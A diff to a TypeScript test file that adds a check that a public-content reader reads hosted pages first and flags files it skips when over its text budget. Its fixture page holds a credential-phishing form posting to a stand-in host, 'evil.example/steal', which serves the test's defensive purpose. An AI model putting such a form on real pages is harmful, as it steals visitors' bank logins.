@@ -34,6 +34,7 @@ import { AI_TOKENS_TALLY } from '../src/llm/operator-ai.js';
 import { createRunService } from '../src/llm/run-service.js';
 import { FAILURES_ALLOWED, OPERATOR_ACTOR_LABEL, tokenMatches } from '../src/operator/endpoint.js';
 import { createOperatorHolds, PUBLIC_PAGES_HOLD } from '../src/operator/holds.js';
+import { buildPublicContent, PUBLIC_CONTENT_FILE_TEXT_MAX, PUBLIC_CONTENT_TEXT_MAX } from '../src/operator/public-content.js';
 import { SIGN_INS_REPORTED } from '../src/operator/status.js';
 import { AVAILABLE, CRYPTO, makeStore, SECRET, SIGNING, type EngineName } from './archive.helpers.js';
 import { ADMIN_PASSWORD, adminPasswordHash, sessionCookie } from './auth-helpers.js';
@@ -404,6 +405,26 @@ describe('public content', () => {
     expect(files.find((file) => file.path === 'assets/logo.png')).toMatchObject({ bytes: 4 });
     expect(files.find((file) => file.path === 'assets/logo.png')?.text).toBeUndefined();
     expect(content.forms).toEqual([]);
+  });
+});
+
+describe('public content past its text budget', () => {
+  it('reads the pages first and marks every file and side whose text it left out', async () => {
+    const side = join(root, 'padded', 'customer');
+    await mkdir(join(side, 'a'), { recursive: true });
+    // More text, in files sorted before the page, than the whole budget.
+    const files = Math.ceil(PUBLIC_CONTENT_TEXT_MAX / PUBLIC_CONTENT_FILE_TEXT_MAX) + 1;
+    const pad = 'x'.repeat(PUBLIC_CONTENT_FILE_TEXT_MAX);
+    for (let i = 0; i < files; i += 1) await writeFile(join(side, 'a', `pad-${String(i).padStart(2, '0')}.txt`), pad);
+    await writeFile(join(side, 'index.html'), '<form action="https://evil.example/steal">Sign in to your bank</form>');
+    const surface = { appKey: 'padded', side: 'customer', root: side, prefix: '/apps/padded/customer' } as unknown as HostedSurface;
+    const content = await buildPublicContent({ surfaces: () => [surface], forms: null });
+    const read = content.sides[0]!;
+    expect(read.files.find((file) => file.path === 'index.html')?.text).toContain('evil.example/steal');
+    const left = read.files.filter((file) => file.text === undefined);
+    expect(left.length).toBeGreaterThan(0);
+    for (const file of left) expect(file.truncated, file.path).toBe(true);
+    expect(read.truncated).toBe(true);
   });
 });
 
